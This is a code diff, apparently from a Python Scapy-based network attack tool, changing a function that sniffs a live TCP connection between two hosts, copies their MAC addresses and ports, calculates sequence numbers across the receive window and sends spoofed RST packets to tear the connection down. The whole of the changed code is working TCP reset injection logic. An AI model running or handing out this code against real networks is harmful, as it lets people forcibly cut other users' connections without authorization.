@@ -16,8 +16,8 @@ def reset_usage(exit_num=None):
 def tcp_reset(client, src, dst, tcp_rst_count=5):
     fin_found = 0
 
-    _, l1, l2 = client.gen_layers(layers=[0, 1, 2], src=src, dst=dst, tcp=True)
-    p = Ether() / l1 / l2
+    l0, l1, l2 = client.gen_layers(src=src, dst=dst, tcp=True)
+    p = l0 / l1 / l2
     client.add_options(p, {'TCP': {'flags': 'R'}})
     p.show()
 
@@ -29,24 +29,18 @@ def tcp_reset(client, src, dst, tcp_rst_count=5):
             lfilter=lambda x: x.haslayer(TCP) and x.haslayer(Raw) and x[IP].src
             == src.ip and x[IP].dst == dst.ip and len(x[TCP].payload) > 0)[0]
 
+        # generating spoofed packets
+        if fin_found == 0:
+            t = {}
+            if src.mac is None or dst.mac is None:
+                t['Ether'] = {'src': pack[Ether].src, 'dst': pack[Ether].dst}
+            if src.port is None or dst.port is None:
+                t['TCP'] = {'sport': pack[TCP].sport, 'dport': pack[TCP].dport}
+            client.add_options(p, t)
+
         # calculating sequence numbers
         max_seq = pack[TCP].seq + tcp_rst_count * pack[TCP].window
         seqs = range(pack[TCP].seq, max_seq, len(pack[TCP].payload))[1:]
-
-        # generating spoofed packets
-        if fin_found == 0:
-            client.add_options(
-                p, {
-                    'Ether': {
-                        'type': pack[Ether].type,
-                        'src': pack[Ether].src,
-                        'dst': pack[Ether].dst
-                    },
-                    'TCP': {
-                        'sport': pack[TCP].sport,
-                        'dport': pack[TCP].dport
-                    }
-                })
 
         # sending spoofed packets with calculated seq num
         for seq in seqs:
